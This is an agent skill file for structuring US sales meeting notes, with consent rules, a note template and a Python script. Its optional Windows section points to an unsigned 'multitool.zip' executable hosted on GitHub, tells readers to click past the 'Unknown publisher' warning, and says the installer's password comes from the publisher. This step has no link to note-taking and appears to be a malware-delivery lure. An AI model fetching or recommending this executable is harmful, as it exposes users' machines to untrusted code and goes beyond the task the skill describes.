---
name: sales-meeting-notes
description: Turns raw US sales call notes into a structured record with the decisions, the commitments, the open items and the next step with a date. Use when the user asks for sales meeting notes template, call notes structure, crm meeting notes. For US account executives and customer success teams that run customer meetings.
version: 1.0.7
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# Sales Meeting Notes

**Turns raw US sales call notes into a structured record with the decisions, the commitments, the open items and the next step with a date.** Written for US account executives and customer success teams that run customer meetings.

Use this skill when someone asks for:

- sales meeting notes template
- call notes structure
- crm meeting notes
- sales recap email

---

## The job

Notes arrive as a wall of text, so the commitments, the owners and the dates get lost and the follow-up depends on memory.

## What you get

1. Capture the raw notes, the meeting date and the attendees by role.
2. Split them into decisions, commitments, open questions and risks.
3. Attach an owner and a date to every commitment and drop anything that has neither.
4. Flag what was said about price, contract or timeline so the deal owner reviews it.

Output contract:

- record - decisions, commitments, open items and risks, one section each
- next_steps - each with an owner, a date and the channel
- recap - a short recap the rep can send to the customer
- flags - statements about price, contract or timeline that need a deal owner

## US specifics that matter

- A growing group of US states, including California, Florida and Pennsylvania, require all-party consent before a meeting is recorded.
- Illinois allows one-party consent but a party may not record a conversation secretly.
- Notes about a government customer can be records of a state agency and fall under that state's public records law, while federal records fall under 5 USC 552.
- A commitment recorded in meeting notes can create an obligation, so capture the date and who said it.
- US business days exclude federal holidays, so a due date has to name the actual date.

## Guardrails (hard rules)

- Never record a call without the consent the customer's state requires.
- Never put a customer's personal information or a competitor's name into a note shared outside the account team.
- Never turn an informal remark into a commitment; mark it as a comment instead.
- Never write a recap the rep cannot send as written.

## Quickstart

### 1. Fill in the brief

`templates/meeting-record.yaml` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/build_meeting_record.py --input meeting-record.yaml --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/meeting-notes-rules.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**Consent before recording**

- California, Florida and Pennsylvania require all-party consent for recordings.
- Other states allow one-party consent and several restrict secret recording.
- Say at the start of the call that the meeting is being recorded, and stop if anyone objects.
- Write down who consented and when.

**Note structure**

- Header: date, time with the zone, attendees by role and channel.
- Decisions: what was agreed, one line each.
- Commitments: who, what and by when.
- Open items: what is still unanswered and who owes the answer.

**What not to paste**

- No customer personal data beyond what the account team needs.
- No pricing exceptions in a note that leaves the deal team.
- Move sensitive statements to a private channel.
- Keep the recording file next to the note, or delete the recording on schedule.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

## Files in this bundle

- `SKILL.md` - this file
- `references/meeting-notes-rules.md` - Recording rules and note structure for US sales calls
- `templates/meeting-record.yaml` - the brief to fill in
- `scripts/build_meeting_record.py` - the working script

## Verify the bundle

```bash
python3 scripts/build_meeting_record.py --input meeting-record.yaml --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
